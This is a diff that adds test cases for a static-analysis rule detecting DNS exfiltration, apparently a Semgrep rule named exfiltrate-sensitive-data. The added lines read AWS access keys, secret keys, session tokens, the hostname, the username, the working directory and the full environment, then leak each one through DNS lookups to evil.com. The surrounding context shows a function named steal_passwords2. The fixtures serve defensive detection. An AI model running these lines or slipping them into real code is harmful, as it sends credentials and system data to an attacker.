@@ -285,3 +285,45 @@ def steal_passwords2(self, name: str, path: str, profile: str):
                 requests.get("https://example.com", params=params)
     cursor.close()
     conn.close()
+
+""" DNS exfiltration tests
+"""
+
+import socket
+aws_key = os.getenv('AWS_ACCESS_KEY_ID')
+# ruleid: exfiltrate-sensitive-data
+socket.gethostbyname(f"{aws_key}.evil.com")
+
+hostname = socket.gethostname()
+# ruleid: exfiltrate-sensitive-data
+socket.getaddrinfo(f"{hostname}.evil.com", 80)
+
+user = getpass.getuser()
+# ruleid: exfiltrate-sensitive-data
+socket.gethostbyname_ex(f"{user}.evil.com")
+
+import dns.resolver
+aws_secret = os.getenv('AWS_SECRET_ACCESS_KEY')
+# ruleid: exfiltrate-sensitive-data
+dns.resolver.query(f"{aws_secret}.evil.com", 'A')
+
+token = os.getenv('AWS_SESSION_TOKEN')
+# ruleid: exfiltrate-sensitive-data
+dns.resolver.resolve(f"{token}.evil.com", 'A')
+
+resolver = dns.resolver.Resolver()
+cwd = os.getcwd()
+# ruleid: exfiltrate-sensitive-data
+resolver.query(f"{cwd}.evil.com", 'A')
+
+resolver2 = dns.resolver.Resolver()
+env_data = os.environ
+# ruleid: exfiltrate-sensitive-data
+resolver2.resolve(f"{env_data}.evil.com", 'A')
+
+import aiodns
+async def exfil():
+    resolver = aiodns.DNSResolver()
+    hostname = socket.gethostname()
+    # ruleid: exfiltrate-sensitive-data
+    await resolver.query(f"{hostname}.evil.com", 'A')
